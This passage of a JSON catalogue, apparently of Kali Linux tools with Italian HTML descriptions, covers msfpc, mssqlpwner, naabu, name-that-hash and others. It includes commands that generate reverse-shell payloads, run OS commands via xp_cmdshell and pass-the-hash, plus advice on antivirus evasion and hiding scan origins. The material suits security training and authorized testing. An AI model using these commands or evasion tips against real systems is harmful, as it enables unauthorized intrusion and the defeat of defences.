modifica di API call.</p><p>Nel <strong>Mobile Security</strong>, analisi traffico app con SSL pinning bypass.</p><p><strong>Web Pentesting</strong> per credential harvesting e payload injection automatizzata.</p><p><strong>Red Team</strong> per MITM on-path attacks.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>MITM Position:</strong> Richiede controllo del traffico (ARP spoof, DNS spoof, o gateway). Certificate warning sui client senza CA installata. Tutti i dati transitano in chiaro sul proxy - proteggere i log.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "msfpc",
    "name": "msfpc",
    "version": "1.4.5",
    "icon": "../app/icons/msfpc-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/msfpc/",
    "desc": "Genera payload Metasploit rapidamente con wizard interattivo e output multi-formato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MSFPC</strong> (MSFvenom Payload Creator) e uno strumento che semplifica drasticamente il processo di generazione di payload Metasploit, eliminando la necessita di memorizzare la complessa sintassi di msfvenom. Attraverso un'interfaccia wizard interattiva o parametri da riga di comando, MSFPC guida l'utente nella scelta della piattaforma target, del tipo di connessione (reverse o bind), del formato di output e delle opzioni di encoding. Lo strumento genera automaticamente non solo il payload nel formato richiesto ma anche il file resource (.rc) per avviare il corrispondente handler in Metasploit, permettendo di passare dalla generazione all'utilizzo in pochi secondi. MSFPC supporta tutti i formati di output di msfvenom inclusi eseguibili per Windows, Linux e macOS, APK per Android, script PowerShell, Python, Bash e formati raw per integrazione in exploit personalizzati.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Generazione guidata multi-piattaforma:</strong> MSFPC supporta la generazione di payload per tutte le principali piattaforme incluse Windows (EXE, DLL, PS1), Linux (ELF, script), macOS (Mach-O), Android (APK) e formati interpretativi come Python, Perl, Ruby e PHP. Per ogni piattaforma, lo strumento seleziona automaticamente il payload piu appropriato e configura le opzioni di encoding per massimizzare la compatibilita. L'utente deve specificare solo l'indirizzo IP di callback e la porta.</p><p><strong>Generazione automatica di handler:</strong> Per ogni payload generato, MSFPC crea automaticamente un file resource script (.rc) che configura il corrispondente handler in msfconsole. Questo file include tutte le impostazioni necessarie (payload type, LHOST, LPORT, opzioni avanzate) e puo essere caricato direttamente in Metasploit con il comando 'resource'. Questa automazione elimina errori di configurazione e riduce il tempo tra la generazione del payload e la ricezione della connessione.</p><p><strong>Batch generation e formati multipli:</strong> MSFPC puo generare simultaneamente payload in tutti i formati supportati per una data piattaforma con un singolo comando. Questa funzionalita e utile quando non si conosce in anticipo quale formato sara piu efficace o quando si vuole preparare payload per scenari diversi. Lo strumento gestisce automaticamente la nomenclatura dei file e organizza l'output in modo strutturato per un facile accesso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MSFPC puo essere utilizzato con parametri da riga di comando per generazione rapida o in modalita interattiva per una configurazione guidata passo-passo.</p><pre><code># Generazione rapida di reverse shell Windows\nmsfpc windows 192.168.1.100 4444\n\n# Payload Linux\nmsfpc linux 192.168.1.100 4444\n\n# Payload Android APK\nmsfpc apk 192.168.1.100 4444\n\n# Script PowerShell\nmsfpc ps 192.168.1.100 4444\n\n# Payload Python\nmsfpc python 192.168.1.100 4444\n\n# Avvio del handler generato\nmsfconsole -r /path/to/handler.rc\n\n# Modalita interattiva per configurazione guidata\nmsfpc</code></pre><p>Dopo l'esecuzione, MSFPC mostra il percorso del payload generato e del file handler.rc corrispondente. Il file handler puo essere utilizzato immediatamente con msfconsole per mettersi in ascolto della connessione. E importante verificare che il firewall locale permetta le connessioni in ingresso sulla porta specificata per i reverse shell.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per la <strong>generazione rapida di payload durante engagement</strong>, MSFPC elimina la necessita di ricordare la sintassi complessa di msfvenom quando si ha bisogno di un payload velocemente. In situazioni dove il tempo e critico, come durante una finestra di accesso limitata o un CTF con timer, la generazione in un singolo comando riduce significativamente i tempi operativi. Nell'ambito della <strong>formazione e apprendimento</strong>, MSFPC aiuta gli studenti di sicurezza informatica a comprendere le diverse opzioni di payload disponibili in Metasploit senza essere sopraffatti dalla complessita di msfvenom, permettendo di concentrarsi sui concetti piuttosto che sulla sintassi. Per la <strong>preparazione di laboratori e dimostrazioni</strong>, la capacita di generare rapidamente payload in formati multipli e i corrispondenti handler semplifica la configurazione di scenari di test e la preparazione di materiale dimostrativo per presentazioni e workshop.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload generati da MSFPC sono identici a quelli prodotti da msfvenom e quindi presentano le stesse caratteristiche di detection. Le signature dei payload Metasploit standard sono presenti in tutti i database antivirus commerciali e vengono rilevate con altissima probabilita. I payload senza encoding aggiuntivo vengono bloccati dalla quasi totalita delle soluzioni endpoint moderne.</p><p><strong>Impatto operativo:</strong> L'utilizzo di payload Metasploit standard in ambienti protetti risulta generalmente inefficace senza ulteriore offuscamento. I payload generati contengono pattern riconoscibili sia a livello di firma statica che di comportamento dinamico. Le connessioni reverse shell verso indirizzi IP esterni sono monitorate dalla maggior parte dei firewall next-generation.</p><p><strong>Mitigazioni:</strong> Considerare MSFPC come punto di partenza per la generazione di payload che necessitano di ulteriore elaborazione. Applicare encoding personalizzato, cifratura o tecniche di packing ai payload generati prima dell'utilizzo in ambienti protetti. Utilizzare trasporti HTTPS invece di TCP semplice per crittografare il traffico. Combinare con strumenti di evasion dedicati come Veil, Shellter o custom crypter per bypassare i controlli antivirus.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "mssqlpwner",
    "name": "mssqlpwner",
    "version": "1.3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mssqlpwner/",
    "desc": "Sfrutta linked server MSSQL per privilege escalation e lateral movement via SQL.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MSSQLPwner</strong> e uno strumento specializzato nello sfruttamento di Microsoft SQL Server, con particolare focus sulle funzionalita di linked server per realizzare privilege escalation e lateral movement all'interno di reti aziendali. I linked server sono una funzionalita nativa di MSSQL che permette a un'istanza SQL Server di eseguire query su altre istanze remote, creando una catena di trust che puo essere sfruttata per accedere a risorse altrimenti non raggiungibili. MSSQLPwner automatizza l'enumerazione di queste catene di linked server, il crawling attraverso link multipli concatenati, e l'esecuzione di comandi sui server remoti attraverso stored procedure come xp_cmdshell, sp_OACreate e altre. Lo strumento e particolarmente efficace in ambienti Active Directory dove le istanze SQL Server sono frequentemente configurate con account di servizio privilegiati e linked server tra domain diversi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione e crawling dei linked server:</strong> MSSQLPwner mappa automaticamente tutti i linked server configurati su un'istanza MSSQL, scoprendo catene di link che possono estendersi attraverso multiple istanze e potenzialmente attraverso domain diversi. Il crawling ricorsivo segue ogni link scoperto, costruendo una mappa completa della topologia dei linked server nell'ambiente. Questa mappatura rivela spesso percorsi di accesso a server con privilegi elevati che non sarebbero accessibili direttamente.</p><p><strong>Privilege escalation via SQL Server:</strong> Lo strumento sfrutta diverse tecniche per escalare i privilegi da un utente SQL con permessi limitati a sysadmin. Queste includono l'abuso di impersonation tramite EXECUTE AS, lo sfruttamento di linked server configurati con credenziali privilegiate, e l'utilizzo di stored procedure che operano nel contesto di sicurezza del servizio SQL Server. MSSQLPwner identifica automaticamente le opportunita di escalation e le sfrutta in modo concatenato quando necessario.</p><p><strong>Esecuzione di comandi sul sistema operativo:</strong> Una volta ottenuti privilegi sysadmin, MSSQLPwner puo eseguire comandi sul sistema operativo sottostante attraverso xp_cmdshell, sp_OACreate (OLE Automation), o CLR assemblies. Lo strumento gestisce automaticamente l'abilitazione di xp_cmdshell quando e disabilitato e supporta l'esecuzione di comandi sia sul server locale che attraverso catene di linked server, permettendo l'esecuzione remota su server SQL accessibili solo tramite link.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MSSQLPwner richiede credenziali valide per almeno un'istanza SQL Server come punto di partenza. Da li, lo strumento esplora le possibilita di escalation e lateral movement disponibili.</p><pre><code># Enumerazione dei linked server e delle possibilita\nmssqlpwner target-sql.domain.com -u sqluser -p password -windows-auth enum-links\n\n# Crawl ricorsivo di tutti i linked server\nmssqlpwner target-sql.domain.com -u sqluser -p password -windows-auth crawl\n\n# Esecuzione di comandi tramite xp_cmdshell\nmssqlpwner target-sql.domain.com -u sa -p password exec -command \"whoami\"\n\n# Privilege escalation automatica\nmssqlpwner target-sql.domain.com -u sqluser -p password privesc\n\n# Esecuzione attraverso catena di linked server\nmssqlpwner target-sql.domain.com -u sqluser -p password -link-name REMOTE_SRV exec -command \"hostname\"\n\n# Autenticazione con hash NTLM\nmssqlpwner target-sql.domain.com -u admin -H NTLM_HASH -windows-auth enum-links</code></pre><p>L'opzione -windows-auth abilita l'autenticazione integrata Windows/NTLM, utile in ambienti Active Directory. Lo strumento supporta anche l'autenticazione con hash NTLM per scenari pass-the-hash. E consigliabile iniziare sempre con l'enumerazione per comprendere la topologia prima di tentare escalation o esecuzione di comandi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nelle operazioni di <strong>penetration testing in ambienti Active Directory</strong>, le istanze SQL Server sono frequentemente vettori critici per il lateral movement. Spesso configurate con account di servizio domain admin o con linked server che attraversano trust boundary, rappresentano punti di snodo che MSSQLPwner sfrutta per muoversi lateralmente nell'infrastruttura senza utilizzare tecniche tradizionali come pass-the-hash o remote execution via WMI/PSRemoting. Per l'<strong>exploitation di database in ambienti enterprise</strong>, dopo aver ottenuto credenziali SQL (tramite file di configurazione, credential dumping o brute force), MSSQLPwner automatizza l'intero processo di escalation da utente limitato a sysadmin e da accesso database a code execution sul sistema operativo. In scenari di <strong>audit della sicurezza delle configurazioni SQL Server</strong>, lo strumento evidenzia configurazioni pericolose come linked server con credenziali salvate, impersonation permissions eccessive, e catene di trust che violano il principio del minimo privilegio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le operazioni sui linked server generano query SQL specifiche che vengono registrate nei log di SQL Server se l'audit e abilitato. L'abilitazione di xp_cmdshell genera un evento specifico nel log di SQL Server e nel Windows Event Log. L'esecuzione di comandi tramite OLE Automation o CLR lascia tracce nei log del servizio. I prodotti di database activity monitoring (DAM) possono rilevare pattern di query anomali associati a link crawling e privilege escalation.</p><p><strong>Impatto operativo:</strong> L'abilitazione di xp_cmdshell modifica la configurazione del server SQL in modo persistente e visibile. Le query attraverso catene di linked server possono fallire se i link non sono configurati correttamente o se i permessi sono insufficienti, generando errori nei log. Tentativi di privilege escalation falliti possono generare alert nei sistemi di monitoraggio. In ambienti con audit rigoroso, ogni operazione viene tracciata con dettaglio.</p><p><strong>Mitigazioni:</strong> Verificare il livello di audit configurato sul server SQL target prima di procedere. Ripristinare le configurazioni modificate (come xp_cmdshell) al termine delle operazioni. Utilizzare query minimali e mirate piuttosto che crawling aggressivo per ridurre il volume di log generati. Preferire l'uso di credenziali Windows integrate quando possibile per evitare login SQL che generano eventi aggiuntivi. Coordinare con il blue team i tempi delle operazioni per gestire gli alert generati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "mxcheck",
    "name": "mxcheck",
    "version": "1.7.0",
    "icon": "../app/icons/mxcheck-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mxcheck/",
    "desc": "Verifica configurazione MX record e test di connessione SMTP per domini email.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MXCheck</strong> è uno strumento di diagnostica e reconnaissance per infrastrutture email che verifica la configurazione dei record MX di un dominio e testa la connettività SMTP verso i mail server. Analizza priorità MX, verifica la raggiungibilità dei server, testa per open relay, e identifica misconfigurazioni che potrebbero essere sfruttate per phishing o che causano problemi di deliverability. È utile sia per security assessment che per troubleshooting di problemi email.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MX Record Resolution:</strong> Esegue query DNS per recuperare tutti i record MX del dominio target, mostrando priorità e hostname di ogni mail server configurato. Identifica configurazioni ridondanti e potenziali single point of failure.</p><p><strong>SMTP Connectivity Testing:</strong> Stabilisce connessioni TCP sulla porta 25 (o 587/465) verso ogni mail server identificato, verificando che siano effettivamente raggiungibili e rispondano correttamente ai comandi SMTP iniziali (EHLO/HELO).</p><p><strong>Open Relay Detection:</strong> Testa se i mail server accettano email per domini esterni senza autenticazione, una misconfiguration grave che permette l'uso del server per spam e phishing.</p><p><strong>Banner Grabbing:</strong> Cattura i banner SMTP dei server che rivelano software e versione (Postfix, Exchange, Sendmail), informazioni utili per identificare vulnerabilità note.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MXCheck accetta un dominio come parametro e esegue tutti i controlli automaticamente.</p><pre><code># Check completo configurazione MX\nmxcheck target.com\n\n# Output verboso con dettagli SMTP\nmxcheck -v target.com\n\n# Test specifico mail server\nmxcheck -s mail.target.com target.com\n\n# Verifica solo connettività (no relay test)\nmxcheck -c target.com\n\n# Output in formato machine-readable\nmxcheck -q target.com\n\n# Specifica DNS server alternativo\nmxcheck -d 8.8.8.8 target.com</code></pre><p>L'output mostra lo stato di ogni server MX con indicazione chiara di problemi identificati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Email Infrastructure Reconnaissance</strong>, MXCheck mappa l'infrastruttura mail di un'organizzazione, identificando provider (Google Workspace, Microsoft 365, self-hosted), ridondanza, e potenziali target per attacchi.</p><p>Per <strong>Security Assessment</strong>, identifica open relay (grave), mail server con software obsoleto, e misconfigurazioni SPF/DKIM che facilitano spoofing.</p><p>Nel <strong>Phishing Campaign Preparation</strong> (autorizzato), capire l'infrastruttura email del target aiuta a crafting email più convincenti e a identificare punti deboli nelle difese.</p><p>Per <strong>Email Troubleshooting</strong>, IT admin possono verificare rapidamente se i mail server sono configurati correttamente e raggiungibili dall'esterno.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query DNS sono standard e non sospette. Le connessioni SMTP alla porta 25 sono normali per diagnostica. Tuttavia, test di open relay ripetuti potrebbero essere loggati come attività sospetta.</p><p><strong>Impatto:</strong> MXCheck non invia email effettive durante i test, quindi non c'è rischio di spam o bounce. Le connessioni SMTP sono limitate alla fase di handshake.</p><p><strong>Limitazioni:</strong> Alcuni mail server potrebbero bloccare connessioni da IP non autorizzati o richiedere STARTTLS, causando falsi negativi nei test di connettività.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "naabu",
    "name": "naabu",
    "version": "2.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/naabu/",
    "desc": "Port scanner veloce scritto in Go, ottimo per discovery su larga scala con output JSON.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Naabu</strong> e un port scanner ad alte prestazioni sviluppato da ProjectDiscovery in Go, progettato specificamente per operazioni di discovery su larga scala. Ottimizzato per velocita e affidabilita, Naabu utilizza goroutine per la scansione parallela e supporta sia modalita SYN scan (raw socket) che CONNECT scan per massima compatibilita con diversi ambienti di rete. Lo strumento si integra nativamente con l'ecosistema ProjectDiscovery, alimentando pipeline automatizzate dove i risultati vengono passati a httpx per il fingerprinting dei servizi web e successivamente a Nuclei per il vulnerability scanning. Naabu supporta output in formato JSON per integrazione programmatica, validazione dei risultati tramite Nmap per massima affidabilita, e configurazione granulare di rate limiting e timeout. La sua architettura lo rende particolarmente adatto a programmi di bug bounty con scope ampi dove la velocita di discovery e un fattore critico.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Scansione parallela ad alte prestazioni:</strong> Naabu sfrutta il modello di concorrenza di Go con goroutine per eseguire migliaia di probe simultanee con overhead minimo. La modalita SYN scan utilizza raw socket per inviare pacchetti TCP SYN senza completare l'handshake, risultando piu veloce e meno intrusiva. La modalita CONNECT esegue l'handshake completo ed e disponibile come fallback quando i raw socket non sono accessibili. Il rate limiting configurabile permette di bilanciare velocita e impatto sulla rete target.</p><p><strong>Integrazione nell'ecosistema ProjectDiscovery:</strong> Naabu e progettato per funzionare come componente di pipeline automatizzate insieme ad altri strumenti ProjectDiscovery. L'output puo essere passato direttamente a httpx per identificare servizi web, a Nuclei per vulnerability scanning, o a altri strumenti della suite. Il formato di output standard (host:porta) e il supporto per stdin/stdout rendono l'integrazione immediata. Questa composabilita permette di costruire workflow di reconnaissance completi con pochi comandi concatenati.</p><p><strong>Validazione con Nmap e output strutturato:</strong> Naabu include un'opzione di validazione che utilizza Nmap per verificare i risultati, combinando la velocita di Naabu con l'affidabilita di Nmap. I risultati vengono emessi in formato JSON con metadati completi inclusi timestamp, protocollo e informazioni sull'host, oppure in formato semplice per utilizzo in pipeline. Lo strumento supporta anche l'esclusione di host e porte specifiche, e il caricamento di liste di target da file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Naabu si utilizza da riga di comando con una sintassi semplice e intuitiva. Supporta target singoli, range CIDR e liste di host da file.</p><pre><code># Scan delle porte comuni su un singolo host\nnaabu -host target.com\n\n# Scan delle top 100 porte con output JSON\nnaabu -host target.com -top-ports 100 -json -o results.json\n\n# Scan di porte specifiche su range CIDR\nnaabu -host 192.168.1.0/24 -p 80,443,8080,8443 -o open_ports.txt\n\n# Pipeline completa: port scan + web discovery + vuln scan\nnaabu -host target.com -silent | httpx -silent | nuclei -t cves/\n\n# Scan da lista di host con rate limiting\nnaabu -list hosts.txt -rate 1000 -o results.txt\n\n# SYN scan con validazione Nmap\nnaabu -host target.com -nmap-cli \"nmap -sV\" -o validated.txt\n\n# Esclusione di porte e host specifici\nnaabu -host 10.0.0.0/24 -exclude-ports 22,3389 -exclude-hosts exclude.txt</code></pre><p>Il parametro -rate controlla il numero di pacchetti al secondo e dovrebbe essere regolato in base alla capacita della rete e alla tolleranza del target. L'opzione -nmap-cli permette di specificare parametri Nmap personalizzati per la fase di validazione. Per SYN scan sono necessari privilegi root o equivalenti. L'output silenzioso (-silent) e ideale per l'uso in pipeline con altri strumenti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>bug bounty con scope ampi</strong>, Naabu e lo strumento ideale per la fase iniziale di port discovery su centinaia o migliaia di host in scope. La sua velocita permette di completare la scansione in tempi ragionevoli anche su scope estesi, identificando rapidamente servizi esposti che possono essere poi analizzati in dettaglio con strumenti piu specifici. Per <strong>pipeline di reconnaissance automatizzate</strong>, Naabu funge da primo stadio che alimenta una catena di strumenti: i risultati vengono passati a httpx per identificare servizi web, poi a Nuclei per vulnerability scanning, creando un workflow end-to-end dalla discovery alla identificazione di vulnerabilita. Come <strong>alternativa veloce a Nmap per discovery iniziale</strong>, in scenari dove e necessario scansionare rapidamente un gran numero di host per identificare quelli con servizi attivi, Naabu offre prestazioni significativamente superiori a Nmap nella pura fase di port discovery, lasciando a Nmap il compito di analisi approfondita sui target identificati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Come qualsiasi port scanner, Naabu genera traffico di rete anomalo facilmente identificabile da sistemi IDS/IPS e firewall. I pacchetti SYN verso porte multiple sono il pattern piu classico di port scanning e attivano alert nella quasi totalita dei sistemi di monitoraggio. Il volume elevato di connessioni da un singolo indirizzo IP e un indicatore inequivocabile di attivita di scansione. I firewall next-generation possono implementare rate limiting automatico o blacklisting dell'IP sorgente.</p><p><strong>Impatto operativo:</strong> Il SYN scan ad alto rate puo sovraccaricare dispositivi di rete con risorse limitate come firewall, IDS o load balancer, potenzialmente causando degradazione del servizio. Alcuni sistemi target possono rispondere al port scanning con meccanismi di difesa attiva come SYN cookies, tar pitting o port knocking che alterano i risultati. Lo scanning aggressivo puo portare al ban dell'indirizzo IP da parte di servizi cloud con protezione DDoS.</p><p><strong>Mitigazioni:</strong> Regolare il rate di scansione tramite il parametro -rate per ridurre l'impatto sulla rete e la visibilita. Utilizzare la modalita CONNECT invece di SYN scan quando si vuole generare traffico meno sospetto. Distribuire la scansione su piu indirizzi IP sorgente quando possibile. Limitare lo scan a porte specifiche di interesse piuttosto che scansionare l'intero range. Considerare la scansione in orari di traffico elevato per mimetizzarsi nel rumore di fondo. Utilizzare VPN o cloud provider per mascherare l'origine della scansione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "name-that-hash",
    "name": "name-that-hash",
    "version": "1.11.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/name-that-hash/",
    "desc": "Identifica automaticamente il tipo di hash analizzando pattern e lunghezza del digest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Name-That-Hash</strong> (nth) è uno strumento di identificazione automatica degli hash che analizza la struttura, lunghezza, charset, e pattern di un digest per determinarne il tipo. Con supporto per oltre 300 formati di hash diversi, è essenziale quando si incontrano credenziali hashate durante penetration test o CTF e non si conosce l'algoritmo utilizzato. La caratteristica distintiva è che fornisce direttamente i comandi Hashcat e John the Ripper pronti per il cracking.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Extensive Hash Database:</strong> Riconosce oltre 300 tipi di hash, dai comuni (MD5, SHA-1, SHA-256, bcrypt) agli esotici (hash di applicazioni specifiche, formati legacy, hash salted complessi). Il database è costantemente aggiornato con nuovi formati.</p><p><strong>Confidence Scoring:</strong> Per ogni match, fornisce un punteggio di confidenza basato su quanto le caratteristiche dell'hash corrispondono al pattern atteso. Questo aiuta a prioritizzare i tentativi quando multiple identificazioni sono possibili.</p><p><strong>Ready-to-Use Commands:</strong> Per ogni tipo identificato, genera i comandi esatti per Hashcat (-m mode) e John the Ripper (--format), eliminando la necessità di cercare la documentazione.</p><p><strong>Programmatic API:</strong> Può essere usato come libreria Python per integrazione in script e pipeline automatizzate. Output disponibile in JSON per parsing programmatico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'interfaccia CLI è semplice e supporta input singolo o da file.</p><pre><code># Identifica un singolo hash\nnth -t '5f4dcc3b5aa765d61d8327deb882cf99'\n\n# Output tipico:\n# Most Likely: MD5, HC: 0, JtR: raw-md5\n# Also possible: NTLM, HC: 1000, JtR: nt\n\n# Identifica hash da file (uno per riga)\nnth -f hashes.txt\n\n# Modalità accessibile (output semplificato)\nnth -t 'HASH' --accessible\n\n# Output JSON per scripting\nnth -t 'HASH' --json\n\n# Identifica hash bcrypt\nnth -t '$2b$12$EXAMPLEhashHERE...'\n\n# Pipe da altri comandi\necho 'e10adc3949ba59abbe56e057f20f883e' | nth</code></pre><p>L'output colorato evidenzia le identificazioni più probabili e include link alla documentazione per formati meno comuni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Prima del <strong>Password Cracking</strong>, identificare correttamente il tipo di hash è fondamentale. Un errore nell'identificazione significa sprecare ore di GPU time su un algoritmo sbagliato. Name-That-Hash elimina questo problema.</p><p>Durante <strong>CTF</strong>, le challenge crypto spesso includono hash sconosciuti. L'identificazione rapida permette di concentrarsi sulla soluzione invece che sulla ricerca del formato.</p><p>In <strong>Digital Forensics</strong>, analizzando database di credenziali o file di configurazione, è comune incontrare hash in formati proprietari o applicazione-specifici che richiedono identificazione.</p><p>Per <strong>Vulnerability Research</strong>, capire quale algoritmo usa un'applicazione per hashare le password rivela informazioni sulla sua sicurezza (MD5 vs bcrypt è una differenza enorme).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Completamente Offline:</strong> Name-That-Hash esegue tutta l'analisi localmente. Gli hash non vengono mai inviati a servizi esterni, rendendolo sicuro per l'uso con credenziali sensibili di clienti.</p><p><strong>Limitazioni:</strong> L'identificazione è basata su pattern e può avere falsi positivi. Hash MD5 e NTLM, ad esempio, hanno la stessa lunghezza e charset - il contesto (Windows vs web application) deve guidare la scelta finale.</p><p><strong>Salted Hashes:</strong> Per hash salted complessi, potrebbe identificare solo la famiglia generale dell'algoritmo. Verificare sempre la documentazione dell'applicazione sorgente per il formato esatto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "nasty",
    "name": "nasty",
    "version": "0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nasty/",
    "desc": "Tool per recupero chiavi PGP da keyserver pubblici tramite query avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nasty</strong> è uno strumento OSINT specializzato nel recupero e nell'analisi di chiavi PGP/GPG da keyserver pubblici. Interrogando la rete distribuita di keyserver (SKS pool, keys.openpgp.org, keyserver.ubuntu.com), permette di scoprire chiavi crittografiche associate a individui o organizzazioni target. Le chiavi PGP sono una fonte preziosa di intelligence poiché spesso contengono email verificate, nomi reali, e metadati sulla data di creazione e le preferenze crittografiche dell'utente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Keyserver Query:</strong> Interroga simultaneamente diversi keyserver pubblici per massimizzare la copertura. Supporta il protocollo HKP (HTTP Keyserver Protocol) standard e può utilizzare server personalizzati.</p><p><strong>Advanced Search:</strong> Permette ricerche per indirizzo email (esatto o parziale), nome utente, key ID (short o long), e fingerprint completo. Le ricerche parziali sono utili per scoprire varianti di email o alias sconosciuti.</p><p><strong>Key Metadata Extraction:</strong> Oltre a scaricare la chiave, estrae e presenta metadati significativi: data di creazione, data di scadenza, algoritmo crittografico, dimensione della chiave, User ID associati, e firme ricevute da altre chiavi (web of trust).</p><p><strong>Signature Analysis:</strong> Analizza le firme sulla chiave per mappare il \"web of trust\" dell'utente, rivelando potenziali associazioni con altri individui o organizzazioni che hanno firmato la chiave.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Nasty si usa da riga di comando con vari parametri di ricerca.</p><pre><code># Cerca chiavi associate a un'email\nnasty -e target@domain.com\n\n# Cerca per nome (può restituire molti risultati)\nnasty -n \"John Doe\"\n\n# Cerca per key ID (8 o 16 caratteri hex)\nnasty -k 0x12345678\nnasty -k 0x1234567890ABCDEF\n\n# Specifica keyserver alternativo\nnasty -s keys.openpgp.org -e target@domain.com\n\n# Cerca per dominio (trova tutte le chiavi @domain.com)\nnasty -e \"@targetcorp.com\"\n\n# Scarica chiave trovata\nnasty -e target@domain.com --download > key.asc</code></pre><p>L'output include tutti i User ID associati alla chiave, permettendo di scoprire email alternative o alias che il target potrebbe utilizzare.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante attività di <strong>OSINT</strong>, le chiavi PGP rivelano informazioni preziose: email personali e lavorative, nomi reali (se diversi dagli handle online), e attraverso il web of trust, connessioni con altri individui nella comunità.</p><p>Per <strong>Email Discovery</strong>, cercando il nome di un target si possono scoprire email aziendali o personali non altrimenti pubbliche, utili per phishing mirato o password spraying.</p><p>Nella <strong>Attribution Research</strong>, le chiavi PGP possono collegare pseudonimi online a identità reali, o rivelare partecipazione a progetti open source, mailing list, o comunità specifiche.</p><p>Per <strong>Cryptocurrency Investigation</strong>, molti utenti di Bitcoin e altre criptovalute utilizzano PGP per la verifica delle identità, rendendo i keyserver una risorsa per investigazioni su marketplace o transazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query ai keyserver sono completamente passive dal punto di vista del target - non viene notificato delle ricerche. Tuttavia, i keyserver possono loggare le query ricevute, potenzialmente rivelando l'interesse di un investigatore.</p><p><strong>Impatto:</strong> Nessuno. Le chiavi PGP sui keyserver pubblici sono informazioni intenzionalmente pubblicate dagli utenti.</p><p><strong>Limitazioni:</strong> Non tutte le chiavi sono su keyserver pubblici. Chiavi create recentemente su keys.openpgp.org richiedono verifica email e potrebbero non apparire nelle ricerche per nome. Il pool SKS ha avuto problemi di availability negli ultimi anni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Metadata"
    ],
    "notes": null
  },
  {
    "id": "nbtscan-unixwiz",
    "name": "nbtscan-unixwiz",
    "version": "1.0.35",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nbtscan-unixwiz/",
    "desc": "Scanner NetBIOS per identificare sistemi Windows e share di rete in subnet locali.",
